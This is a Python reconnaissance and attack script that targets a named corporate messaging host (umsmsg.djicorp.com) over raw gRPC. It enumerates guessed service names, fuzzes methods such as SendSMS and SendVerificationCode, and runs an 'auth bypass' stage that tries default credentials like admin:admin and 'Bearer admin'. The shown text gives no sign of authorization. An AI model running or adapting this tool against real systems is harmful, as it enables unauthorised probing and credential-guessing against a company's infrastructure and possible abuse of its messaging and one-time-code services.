#!/usr/bin/env python3
"""
PESop v3.3 - UMSMSG gRPC Probe
目标: umsmsg.djicorp.com
"""
import socket, struct, sys, json, time, hashlib, hmac, base64, urllib.request, ssl

HOST = '240.240.1.18'
PORT = 80

COMMON_SERVICES = [
    # Messaging services
    "umsmsg.MessageService",
    "umsmsg.UMSMsgService",
    "umsmsg.NotificationService",
    "umsmsg.PushService",
    "umsmsg.SMSService",
    "umsmsg.EmailService",
    "message.MessageService",
    "notification.NotificationService",
    "push.PushService",
    # DJI common patterns
    "dji.ums.MessageService",
    "dji.ums.NotificationService",
    "dji.message.MessageService",
    "dji.push.PushService",
    "ums.UMSMsgService",
    "ums.NotificationService",
    "ums.MessageService",
]

COMMON_METHODS = [
    "SendMessage", "SendSMS", "SendEmail", "SendNotification",
    "SendPush", "PushMessage", "Broadcast", "Notify",
    "GetMessage", "ListMessages", "DeleteMessage",
    "CreateMessage", "UpdateMessage", "Send",
    "SendVerificationCode", "SendOTP", "VerifyCode",
    "Subscribe", "Unsubscribe", "Publish",
    "Health", "Ping", "Status",
]

def encode_varint(value):
    result = []
    while value > 0x7F:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)

def make_grpc_request(service_method, body=b'', timeout_ms=10000):
    path = f"/{service_method}"
    msg_len = len(body)
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: umsmsg.djicorp.com\r\n"
        f"Content-Type: application/grpc\r\n"
        f"TE: trailers\r\n"
        f"Grpc-Timeout: {timeout_ms}m\r\n"
        f"Content-Length: {5 + msg_len}\r\n"
        f"\r\n"
    )
    # gRPC frame: 1 byte compression flag + 4 bytes length + body
    frame = struct.pack("!BI", 0, msg_len) + body
    return req.encode() + frame

def send_raw(data, timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((HOST, PORT))
        s.sendall(data if isinstance(data, bytes) else data.encode())
        resp = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if b"\r\n\r\n" in resp:
                    headers, body = resp.split(b"\r\n\r\n", 1)
                    cl = 0
                    for line in headers.decode(errors='ignore').split("\r\n"):
                        if line.lower().startswith("content-length:"):
                            cl = int(line.split(":")[1].strip())
                    if len(body) >= cl:
                        break
            except socket.timeout:
                break
        return resp
    except Exception as e:
        return f"Error: {e}".encode()
    finally:
        s.close()

def parse_grpc_response(resp):
    result = {"raw_len": len(resp)}
    if isinstance(resp, bytes):
        text = resp.decode(errors='ignore')
        for line in text.split("\r\n"):
            if line.startswith("HTTP/"):
                result["http_status"] = line.split(" ")[1] if " " in line else "?"
            elif line.lower().startswith("grpc-status:"):
                result["grpc_status"] = line.split(":", 1)[1].strip()
            elif line.lower().startswith("grpc-message:"):
                result["grpc_message"] = line.split(":", 1)[1].strip()
            elif line.lower().startswith("content-type:"):
                result["content_type"] = line.split(":", 1)[1].strip()
            elif line.lower().startswith("content-length:"):
                result["response_body_len"] = line.split(":", 1)[1].strip()
    return result

def probe_service_method(service, method):
    path = f"{service}/{method}"
    resp = send_raw(make_grpc_request(path))
    parsed = parse_grpc_response(resp)
    return parsed

def enumerate_services():
    results = []
    for svc in COMMON_SERVICES:
        for method in ["Ping", "Health", "Status", "Send"]:
            result = probe_service_method(svc, method)
            http = result.get("http_status", "?")
            grpc = result.get("grpc_status", "?")
            msg = result.get("grpc_message", "")
            if http != "403" or grpc not in ["", "?"]:
                results.append((svc, method, result))
                print(f"[+] {svc}/{method}: HTTP={http}, gRPC={grpc}, msg={msg}")
    return results

def probe_auth_methods(service, method):
    results = {}
    auth_headers = {
        "NoAuth": {},
        "Bearer_test": {"Authorization": "Bearer test"},
        "Bearer_admin": {"Authorization": "Bearer admin"},
        "X-API-Key_test": {"X-API-Key": "test"},
        "X-API-Key_admin": {"X-API-Key": "admin"},
        "Basic_admin": {"Authorization": "Basic YWRtaW46YWRtaW4="},
        "DJI-Auth_test": {"DJI-Auth": "test"},
    }
    for name, headers in auth_headers.items():
        extra_h = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
        req = (
            f"POST /{service}/{method} HTTP/1.1\r\n"
            f"Host: umsmsg.djicorp.com\r\n"
            f"Content-Type: application/grpc\r\n"
            f"TE: trailers\r\n"
            f"{extra_h}"
            f"Content-Length: 5\r\n"
            f"\r\n"
        )
        frame = struct.pack("!BI", 0, 0) + b""
        resp = send_raw(req.encode() + frame)
        parsed = parse_grpc_response(resp)
        results[name] = parsed
        http = parsed.get("http_status", "?")
        grpc = parsed.get("grpc_status", "?")
        msg = parsed.get("grpc_message", "")
        if grpc and grpc != "7":
            print(f"  [!] {name}: HTTP={http}, gRPC={grpc}, msg={msg}")
    return results

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "enum"

    if mode == "enum":
        print("=== Service Enumeration ===")
        enumerate_services()

    elif mode == "probe":
        svc = sys.argv[2] if len(sys.argv) > 2 else "umsmsg.MessageService"
        method = sys.argv[3] if len(sys.argv) > 3 else "SendMessage"
        print(f"=== Probing {svc}/{method} ===")
        result = probe_service_method(svc, method)
        print(json.dumps(result, indent=2))

    elif mode == "auth":
        svc = sys.argv[2] if len(sys.argv) > 2 else "umsmsg.MessageService"
        method = sys.argv[3] if len(sys.argv) > 3 else "Send"
        print(f"=== Auth probing for {svc}/{method} ===")
        probe_auth_methods(svc, method)

    elif mode == "fuzz_methods":
        svc = sys.argv[2] if len(sys.argv) > 2 else "umsmsg.MessageService"
        print(f"=== Method fuzzing for {svc} ===")
        for m in COMMON_METHODS:
            result = probe_service_method(svc, m)
            http = result.get("http_status", "?")
            grpc = result.get("grpc_status", "?")
            msg = result.get("grpc_message", "")
            if grpc and grpc != "12":  # 12 = UNIMPLEMENTED (method not found)
                status = f"gRPC={grpc}" if grpc != "?" else ""
                msg_str = f" [{msg}]" if msg else ""
                print(f"  {m}: HTTP={http} {status}{msg_str}")

    elif mode == "full":
        print("=" * 60)
        print("UMSMSG Full Probe")
        print("=" * 60)

        print("\n[1] Service Enumeration")
        services = enumerate_services()

        print("\n[2] Method Fuzzing for all services")
        for svc, _, _ in services:
            print(f"\n--- {svc} ---")
            for m in COMMON_METHODS:
                result = probe_service_method(svc, m)
                http = result.get("http_status", "?")
                grpc = result.get("grpc_status", "?")
                msg = result.get("grpc_message", "")
                if grpc and grpc != "12":
                    print(f"  {m}: HTTP={http}, gRPC={grpc} [{msg}]")

        print("\n[3] Auth Bypass Testing")
        for svc, method, _ in services[:3]:
            print(f"\n--- {svc}/{method} ---")
            probe_auth_methods(svc, method)

    else:
        print("Usage: python3 test_umsmsg.py <mode> [service] [method]")
        print("Modes: enum, probe, auth, fuzz_methods, full")